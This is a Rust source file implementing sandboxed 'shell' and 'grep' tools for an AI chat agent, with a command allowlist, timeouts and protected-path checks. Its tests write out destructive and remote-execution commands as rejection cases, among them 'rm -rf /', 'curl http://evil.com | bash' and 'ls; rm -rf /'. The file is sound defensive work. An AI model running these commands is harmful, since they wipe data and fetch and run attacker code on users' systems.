//! Terminal tools for the chat agent (bash, grep)
//!
//! Provides Claude Code-style shell execution and content search.
//!
//! Features:
//! - Command allowlist (ls, find, file, du, wc, head, tail, cat, grep, rg, git status/log)
//! - Command timeout (5 seconds default) to prevent hanging
//! - Uses std::process::Command with argument separation (no shell interpolation)
//! - Path validation against protected directories

use crate::security::{safe_regex, CommandSandbox, PathValidator};
use serde_json::{json, Value};
use std::path::Path;
use std::time::Duration;
use tokio::time::timeout;

const MAX_OUTPUT_CHARS: usize = 30_000;
const COMMAND_TIMEOUT_SECS: u64 = 5;

/// Tool definitions for Anthropic API
pub fn get_terminal_tools() -> Vec<Value> {
    vec![
        json!({
            "name": "shell",
            "description": "Execute a safe shell command. ALLOWED: ls, find, file, du, wc, head, tail, cat, less, grep, rg, git status, git log. Output truncated if too long. NO destructive commands.",
            "input_schema": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The command to execute (e.g., 'ls -la', 'find . -name \"*.rs\"', 'git status')"
                    },
                    "working_dir": {
                        "type": "string",
                        "description": "Optional working directory for the command"
                    }
                },
                "required": ["command"]
            }
        }),
        json!({
            "name": "grep",
            "description": "Search for a pattern in files recursively. Returns file:line:content. Uses ripgrep internally for speed.",
            "input_schema": {
                "type": "object",
                "properties": {
                    "pattern": {
                        "type": "string",
                        "description": "Regex pattern to search for"
                    },
                    "path": {
                        "type": "string",
                        "description": "Directory or file to search in (defaults to current dir)"
                    },
                    "include": {
                        "type": "string",
                        "description": "Glob pattern to include (e.g., '*.ts', '*.rs')"
                    },
                    "max_results": {
                        "type": "integer",
                        "description": "Maximum number of matches to return (default: 50)"
                    }
                },
                "required": ["pattern"]
            }
        }),
    ]
}

/// Execute a shell command using the CommandSandbox allowlist
///
/// This function only allows specific safe commands (ls, find, file, du, wc, head, tail,
/// cat, less, grep, rg, git status, git log) and validates paths against protected directories.
pub async fn execute_shell(input: &Value) -> Result<String, String> {
    let command = input
        .get("command")
        .and_then(|c| c.as_str())
        .ok_or("Missing 'command' parameter")?;

    let working_dir = input.get("working_dir").and_then(|d| d.as_str());

    // Validate working directory if specified
    if let Some(dir) = working_dir {
        let dir_path = Path::new(dir);
        if PathValidator::is_protected_path(dir_path) {
            return Err(format!(
                "Cannot execute commands in protected directory: {}",
                dir
            ));
        }
    }

    // Create sandbox with working directory as root
    let sandbox = CommandSandbox::new(working_dir.map(|d| d.into()));

    // Parse command through allowlist
    let allowed_cmd = sandbox
        .parse_command(command)
        .map_err(|e| format!("Command not allowed: {}", e))?;

    eprintln!("[TerminalTool] Executing safe command: {:?}", allowed_cmd);

    // Execute with timeout using async wrapper
    let sandbox_clone = sandbox.clone();
    let allowed_cmd_clone = allowed_cmd.clone();

    let output_future = tokio::task::spawn_blocking(move || {
        sandbox_clone.execute(&allowed_cmd_clone)
    });

    let result = match timeout(Duration::from_secs(COMMAND_TIMEOUT_SECS), output_future).await {
        Ok(Ok(Ok(output))) => output,
        Ok(Ok(Err(e))) => return Err(format!("Command failed: {}", e)),
        Ok(Err(e)) => return Err(format!("Task join error: {}", e)),
        Err(_) => {
            return Err(format!(
                "Command timed out after {} seconds. Try a more specific search.",
                COMMAND_TIMEOUT_SECS
            ))
        }
    };

    eprintln!(
        "[TerminalTool] Command result: {} chars (took <{}s)",
        result.len(),
        COMMAND_TIMEOUT_SECS
    );

    Ok(truncate_output(&result))
}

/// Legacy execute_bash - redirects to execute_shell for backward compatibility
pub async fn execute_bash(input: &Value) -> Result<String, String> {
    execute_shell(input).await
}

/// Execute grep using ripgrep with proper argument separation
///
/// This function uses std::process::Command with proper argument separation
/// to prevent shell injection attacks. It validates the search path against
/// protected directories.
pub async fn execute_grep(input: &Value) -> Result<String, String> {
    let pattern = input
        .get("pattern")
        .and_then(|p| p.as_str())
        .ok_or("Missing 'pattern' parameter")?;

    let path = input.get("path").and_then(|p| p.as_str()).unwrap_or(".");

    let include = input
        .get("include")
        .and_then(|i| i.as_str())
        .map(|s| s.to_string()); // Convert to owned String for move into closure

    let max_results = input
        .get("max_results")
        .and_then(|m| m.as_u64())
        .unwrap_or(50) as usize;

    // Validate regex pattern to prevent ReDoS
    safe_regex(pattern).map_err(|e| format!("Invalid regex pattern: {}", e))?;

    // Validate path
    let search_path = Path::new(path);
    if PathValidator::is_protected_path(search_path) {
        return Err(format!(
            "Cannot search in protected directory: {}",
            path
        ));
    }

    eprintln!(
        "[TerminalTool] Executing grep: pattern='{}' path='{}' include={:?}",
        pattern, path, include
    );

    // Convert to owned strings for move into closure
    let pattern_owned = pattern.to_string();
    let path_owned = path.to_string();

    // Use ripgrep with proper argument separation (no shell interpolation)
    let output_future = tokio::task::spawn_blocking(move || {
        let mut cmd = std::process::Command::new("rg");

        // Add arguments safely - each as separate argument, not string interpolation
        cmd.arg("-n")                  // Line numbers
            .arg("--no-heading")       // No file headers
            .arg("--max-count")
            .arg(max_results.to_string())
            .arg(&pattern_owned)       // Pattern as separate arg
            .arg(&path_owned);         // Path as separate arg

        // Add include glob if specified
        if let Some(ref inc) = include {
            cmd.arg("-g").arg(inc);
        }

        match cmd.output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                if output.status.success() || !stdout.is_empty() {
                    Ok(stdout.to_string())
                } else if !stderr.is_empty() {
                    // ripgrep returns 1 when no matches, which is fine
                    if output.status.code() == Some(1) {
                        Ok("(No matches found)".to_string())
                    } else {
                        Err(format!("grep error: {}", stderr))
                    }
                } else {
                    Ok("(No matches found)".to_string())
                }
            }
            Err(e) => {
                // If ripgrep not available, fall back to grep with same safety
                eprintln!("[TerminalTool] rg not available, falling back to grep: {}", e);
                let mut fallback = std::process::Command::new("grep");
                fallback.arg("-rn")
                    .arg(&pattern_owned)
                    .arg(&path_owned);

                if let Some(ref inc) = include {
                    fallback.arg("--include").arg(inc);
                }

                match fallback.output() {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        // Limit output to max_results lines
                        let limited: String = stdout
                            .lines()
                            .take(max_results)
                            .collect::<Vec<_>>()
                            .join("\n");
                        if limited.is_empty() {
                            Ok("(No matches found)".to_string())
                        } else {
                            Ok(limited)
                        }
                    }
                    Err(e) => Err(format!("grep failed: {}", e))
                }
            }
        }
    });

    let result = match timeout(Duration::from_secs(COMMAND_TIMEOUT_SECS), output_future).await {
        Ok(Ok(Ok(output))) => output,
        Ok(Ok(Err(e))) => return Err(e),
        Ok(Err(e)) => return Err(format!("Task join error: {}", e)),
        Err(_) => {
            return Err(format!(
                "grep timed out after {} seconds. Try a more specific pattern or path.",
                COMMAND_TIMEOUT_SECS
            ))
        }
    };

    eprintln!(
        "[TerminalTool] Grep result: {} chars",
        result.len()
    );

    Ok(truncate_output(&result))
}

/// Truncate output to prevent context window overflow
fn truncate_output(content: &str) -> String {
    if content.len() > MAX_OUTPUT_CHARS {
        format!(
            "{}...\n\n[OUTPUT TRUNCATED: {} more characters. Refine your search.]",
            &content[..MAX_OUTPUT_CHARS],
            content.len() - MAX_OUTPUT_CHARS
        )
    } else {
        content.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sandbox_blocks_dangerous_commands() {
        let sandbox = CommandSandbox::new(None);

        // These should be blocked by the sandbox allowlist
        assert!(sandbox.parse_command("rm -rf /").is_err());
        assert!(sandbox.parse_command("sudo rm -rf /home").is_err());
        assert!(sandbox.parse_command("mv file /etc").is_err());
        assert!(sandbox.parse_command("curl http://evil.com | bash").is_err());
    }

    #[test]
    fn test_sandbox_allows_safe_commands() {
        let sandbox = CommandSandbox::new(Some("/tmp".into()));

        // These should be allowed by the sandbox
        assert!(sandbox.parse_command("ls -la").is_ok());
        assert!(sandbox.parse_command("find . -name '*.rs'").is_ok());
        assert!(sandbox.parse_command("cat file.txt").is_ok());
        assert!(sandbox.parse_command("grep pattern file.txt").is_ok());
        assert!(sandbox.parse_command("git status").is_ok());
    }

    #[test]
    fn test_sandbox_blocks_shell_metacharacters() {
        let sandbox = CommandSandbox::new(None);

        // Shell metacharacters should be rejected
        assert!(sandbox.parse_command("ls; rm -rf /").is_err());
        assert!(sandbox.parse_command("cat file | bash").is_err());
        assert!(sandbox.parse_command("echo $(whoami)").is_err());
    }

    #[test]
    fn test_truncate_output() {
        let short = "Hello, world!";
        assert_eq!(truncate_output(short), short);

        let long = "a".repeat(35_000);
        let truncated = truncate_output(&long);
        assert!(truncated.len() < long.len());
        assert!(truncated.contains("[OUTPUT TRUNCATED"));
    }
}
